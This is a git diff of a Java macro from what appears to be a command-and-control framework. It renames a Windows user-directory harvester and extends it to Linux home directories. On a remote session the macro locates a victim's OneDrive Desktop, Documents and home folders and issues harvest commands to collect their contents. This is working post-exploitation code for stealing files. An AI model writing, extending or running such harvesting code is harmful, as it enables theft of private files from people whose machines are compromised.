@@ -5,15 +5,15 @@ import c2.HarvestProcessor;
 import c2.session.IOManager;
 import c2.win.WindowsCmdLineHelper;
 
-public class WindowsDirectoryHarvester extends AbstractCommandMacro {
+public class UserDirectoryHarvester extends AbstractCommandMacro {
 
-	public static String HARVEST_WINDOWS_USER_DIRS_CMD = "harvest_win_user_dir";
+	public static String HARVEST_USER_DIRS_CMD = "harvest_user_dir";
 	
 	private IOManager io;
 	
 	@Override
 	public boolean isCommandMatch(String cmd) {
-		return cmd.equals(HARVEST_WINDOWS_USER_DIRS_CMD);
+		return cmd.equals(HARVEST_USER_DIRS_CMD);
 	}
 
 	@Override
@@ -30,10 +30,12 @@ public class WindowsDirectoryHarvester extends AbstractCommandMacro {
 		String response = io.awaitMultilineCommands(sessionId);
 		outcome.addResponseIo(response);
 		response = response.replace(System.lineSeparator(), "");
-		if(!response.equals(Commands.OS_HERITAGE_RESPONSE_WINDOWS)) {
+		if(!response.equals(Commands.OS_HERITAGE_RESPONSE_WINDOWS) && !response.equals(Commands.OS_HERITAGE_RESPONSE_LINUX)) {
 			outcome.addError("Unsupported operating system: " + response);
 			return outcome;
 		}
+		
+		String os = response;
 		
 		io.sendCommand(sessionId, Commands.PWD);
 		outcome.addSentCommand(Commands.PWD);
@@ -48,6 +50,8 @@ public class WindowsDirectoryHarvester extends AbstractCommandMacro {
 			return outcome;
 		}
 		
+		if(os.equals(Commands.OS_HERITAGE_RESPONSE_WINDOWS)) {
+		
 		try {
 			String onedriveDir = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%ONEDRIVE%");
 			outcome.addMacroMessage("Found OneDrive folder: " + onedriveDir);
@@ -61,6 +65,7 @@ public class WindowsDirectoryHarvester extends AbstractCommandMacro {
 				outcome.addError("Unable to switch to OneDrive Desktop for harvest");
 			} else {
 				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
+				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
 				response = io.awaitMultilineCommands(sessionId);
 				outcome.addResponseIo(response);
 			}
@@ -74,6 +79,7 @@ public class WindowsDirectoryHarvester extends AbstractCommandMacro {
 				outcome.addError("Unable to switch to OneDrive Documents for harvest");
 			} else {
 				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
+				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
 				response = io.awaitMultilineCommands(sessionId);
 				outcome.addResponseIo(response);
 			}
@@ -93,6 +99,7 @@ public class WindowsDirectoryHarvester extends AbstractCommandMacro {
 				outcome.addError("Unable to switch to OneDrive Desktop for harvest");
 			} else {
 				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
+				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
 				response = io.awaitMultilineCommands(sessionId);
 				outcome.addResponseIo(response);
 			}
@@ -105,11 +112,27 @@ public class WindowsDirectoryHarvester extends AbstractCommandMacro {
 				outcome.addError("Unable to switch to OneDrive Documents for harvest");
 			} else {
 				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
+				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
 				response = io.awaitMultilineCommands(sessionId);
 				outcome.addResponseIo(response);
 			}
 		}catch (Exception ex) {
 			outcome.addMacroMessage("Could not find user profile folder, proceedind.");
+		}
+		}else {//Linux
+			String cdToHomeDir = Commands.CD + " ~";
+			outcome.addSentCommand(cdToHomeDir);
+			io.sendCommand(sessionId, cdToHomeDir);
+			response = io.awaitMultilineCommands(sessionId);
+			outcome.addResponseIo(response);
+			if(response.contains("no such file or directory")) {
+				outcome.addError("Cannot switch to Linux home directory");
+			}else {
+				io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
+				outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
+				response = io.awaitMultilineCommands(sessionId);
+				outcome.addResponseIo(response);
+			}
 		}
 		
 		//Restore original
